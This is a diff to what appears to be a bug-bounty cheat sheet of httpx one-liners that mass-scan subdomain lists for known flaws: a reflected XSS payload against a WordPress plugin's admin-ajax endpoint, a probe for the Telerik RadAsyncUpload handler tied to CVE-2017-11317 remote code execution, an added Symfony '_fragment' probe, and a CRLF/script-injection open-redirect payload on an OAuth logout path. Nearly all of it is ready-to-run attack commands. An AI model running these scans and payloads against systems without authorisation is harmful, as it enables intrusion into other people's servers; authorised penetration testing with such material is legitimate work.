@@ -19,8 +19,10 @@
     cat domain.txt | httpx -path "/wp-admin/admin-ajax.php?action=ptp_design4_color_columns&post_id=1&column_names=%3Ch1%3EAkira%3C/h1%3E" -ms "<h1>Akira</h1>" -fe "Location: .*<h1>Akira</h1>.*" -t 200 -mc 200
 
 ## Telerik RCE(CVE-2017-11317)
-    cat subs.txt | /workspace/go/bin/httpx -path "/Telerik.Web.UI.WebResource.axd?type=rau" -ms '{ "message" : "RadAsyncUpload handler is registered succesfully, however, it may not be accessed directly." }' -t 200 -o telerik2.txt
+    cat subs.txt | /workspace/go/bin/httpx -path "/Telerik.Web.UI.WebResource.axd?type=rau" -ms '{ "message" : "RadAsyncUpload handler is registered succesfully, however, it may no' -t 200 -o telerik2.txt
 
+## Symphonic
+    cat subs.txt | httpx -path "_fragment" -ms 'Oops An Error Occurred' -o symphonic.txt -t 200
     
 ## Open Redirect
     cat URlSubs.txt | ~/go/bin/httpx -path "/oauth/idp/logout?post_logout_redirect_uri=%0d%0a%0d%0a%3Cscript%3Ealert('XSSSS')%3C/script%3E" -ms "XSSSSS" -fe "Location: .*XSSS.*" -t 200 -o xss.txt
